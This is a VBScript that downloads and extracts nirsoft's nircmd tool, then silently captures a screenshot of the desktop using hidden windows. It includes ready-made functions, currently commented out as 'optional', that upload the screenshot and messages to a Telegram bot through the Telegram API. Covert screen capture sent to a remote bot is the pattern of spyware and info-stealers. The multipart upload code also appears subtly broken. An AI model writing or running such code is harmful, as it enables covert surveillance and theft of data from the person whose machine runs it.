' Define the directory where nircmd.exe will be saved
nircmdDir = "C:\Tools" ' This will be the directory where nircmd.exe will be saved
nircmdPath = nircmdDir & "\nircmd.exe" ' Full path of nircmd.exe
nircmdZipPath = nircmdDir & "\nircmd.zip" ' Path to save the downloaded ZIP file
nircmdURL = "https://www.nirsoft.net/utils/nircmd.zip" ' URL of nircmd.zip (zip version)

' Step 1: Create the directory if it doesn't exist
If Not FolderExists(nircmdDir) Then
    CreateFolder nircmdDir
End If

' Step 2: Check if nircmd.exe exists, if not, download and extract it
If Not FileExists(nircmdPath) Then
    ' If nircmd.exe doesn't exist, download and extract it
    DownloadNircmd nircmdURL, nircmdZipPath ' Download the ZIP file
    ExtractZip nircmdZipPath, nircmdDir ' Extract the ZIP file to the directory
End If

' Step 3: Run nircmd.exe to capture the screenshot automatically
CaptureScreenshot()

' Function to check if a file exists
Function FileExists(filePath)
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    FileExists = objFSO.FileExists(filePath)
End Function

' Function to check if a folder exists
Function FolderExists(folderPath)
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    FolderExists = objFSO.FolderExists(folderPath)
End Function

' Function to create a folder
Sub CreateFolder(folderPath)
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    objFSO.CreateFolder(folderPath)
End Sub

' Function to download a file from a URL
Sub DownloadNircmd(url, savePath)
    Set xmlhttp = CreateObject("MSXML2.XMLHTTP.6.0")
    Set stream = CreateObject("ADODB.Stream")
    
    xmlhttp.Open "GET", url, False
    xmlhttp.Send
    
    ' Save the file to the specified path
    stream.Open
    stream.Type = 1 ' binary
    stream.Write xmlhttp.responseBody
    stream.SaveToFile savePath, 2 ' Overwrite if file exists
    stream.Close
End Sub

' Function to extract a ZIP file using PowerShell (requires PowerShell)
Sub ExtractZip(zipPath, destination)
    Set objShell = CreateObject("WScript.Shell")
    
    ' Run PowerShell to extract the ZIP
    objShell.Run "powershell -Command ""Expand-Archive -Path '" & zipPath & "' -DestinationPath '" & destination & "'""", 0, True
End Sub

' Function to capture a screenshot and save it to a file
Sub CaptureScreenshot()
    ' Run nircmd to capture the screenshot
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run Chr(34) & nircmdPath & Chr(34) & " savescreenshot " & nircmdDir & "\screenshot.png", 0, True
    
    ' You can also send it to Telegram here if you like (optional)
    ' SendTelegramMessage "Screenshot captured and saved!"
    ' Call SendPhotoToTelegram(nircmdDir & "\screenshot.png") ' If you want to send the screenshot to Telegram
End Sub

' Optional Telegram Message Functions (if you want to send the screenshot to Telegram)
' Telegram Bot details
botToken = "YOUR_BOT_TOKEN" ' Replace with your bot token
chatID = "YOUR_CHAT_ID" ' Replace with your chat ID

' Function to send message to Telegram
Sub SendTelegramMessage(message)
    On Error Resume Next
    Dim xmlhttp
    Set xmlhttp = CreateObject("MSXML2.XMLHTTP.6.0")
    xmlhttp.Open "GET", "https://api.telegram.org/bot" & botToken & "/sendMessage?chat_id=" & chatID & "&text=" & message, False
    xmlhttp.Send
    If Err.Number <> 0 Then Err.Clear
End Sub

' Function to send photo to Telegram
Sub SendPhotoToTelegram(photoPath)
    On Error Resume Next
    Dim xmlhttp, boundary, body, fileData, fileName
    Set xmlhttp = CreateObject("MSXML2.XMLHTTP.6.0")

    boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
    body = "--" & boundary & vbCrLf
    body = body & "Content-Disposition: form-data; name=""chat_id""" & vbCrLf & vbCrLf & chatID & vbCrLf
    body = body & "--" & boundary & vbCrLf
    body = body & "Content-Disposition: form-data; name=""photo""; filename=""screenshot.png""" & vbCrLf
    body = body & "Content-Type: image/png" & vbCrLf & vbCrLf
    
    ' Open the file data
    Set fileData = CreateObject("ADODB.Stream")
    fileData.Type = 1 ' binary
    fileData.Open
    fileData.LoadFromFile photoPath
    body = body & fileData.Read(fileData.Size) & vbCrLf
    body = body & "--" & boundary & "--" & vbCrLf

    ' Send the request
    xmlhttp.Open "POST", "https://api.telegram.org/bot" & botToken & "/sendPhoto", False
    xmlhttp.setRequestHeader "Content-Type", "multipart/form-data; boundary=" & boundary
    xmlhttp.Send body
    If Err.Number <> 0 Then Err.Clear
End Sub
